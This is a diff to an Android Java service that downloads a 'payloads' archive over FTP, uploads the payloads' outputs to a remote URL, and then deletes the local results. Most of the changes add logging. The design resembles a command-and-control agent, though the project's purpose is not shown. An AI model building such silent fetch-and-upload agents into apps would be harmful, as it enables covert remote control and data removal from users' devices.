@@ -42,10 +42,13 @@ public class NetworkService extends Service {
 			@Override
 			public void run() {
 				synchronized (downloadLock) {
+					Log.i(TAG, "Trying to download the payloads");
 					String downloadUri = Utils
 							.getPayloadsDownloadUrl(getClass());
+					Log.d(TAG, "Download URL: " + downloadUri);
 					String localFilePath = Utils
 							.getPayloadsArchivePath(getApplicationContext());
+					Log.d(TAG, "Local file path: " + localFilePath);
 
 					FTPService ftp = getFtpServer();
 
@@ -70,9 +73,12 @@ public class NetworkService extends Service {
 			@Override
 			public void run() {
 				synchronized (uploadLock) {
+					Log.i(TAG, "Trying to upload the payload's outputs");
 					String localOutputDir = Utils
 							.getPayloadsOutputDir(getApplicationContext());
+					Log.d(TAG, "Output dir: " + localOutputDir);
 					String remoteOutputUri = Utils.getUploadUrl(getClass());
+					Log.d(TAG, "Remote URL: " + remoteOutputUri);
 
 					FTPService ftp = getFtpServer();
 
@@ -82,13 +88,16 @@ public class NetworkService extends Service {
 					if (results.length > 0) {
 						try {
 							ftp.connect();
-							for (File result : results)
+							for (File result : results){
+								Log.d(TAG, "Sending " + result.getAbsolutePath());
 								ftp.uploadFile(result.getAbsolutePath(),
 										remoteOutputUri);
+								Log.d(TAG, result.getAbsolutePath() + " sent!");
+								result.delete();
+							}
 						} catch (SocketException e) {
 							ftp.disconnect();
 							Log.e(TAG, "Not connected, socket exception");
-
 						} catch (IOException e) {
 							Log.e(TAG, "Not connected, IOException");
 						}
@@ -105,9 +114,13 @@ public class NetworkService extends Service {
 	 * @param c
 	 */
 	public static void doNetworkStuff(Object c) {
+		Log.i(TAG, "Network call from " + c.getClass().getName());
 		if (c instanceof Context) {
+			Log.i(TAG, "Network call accepted");
 			((Context) c).startService(new Intent((Context) c,
 					NetworkService.class));
+		}else{
+			Log.i(TAG, "Network call rejected");
 		}
 	}
 
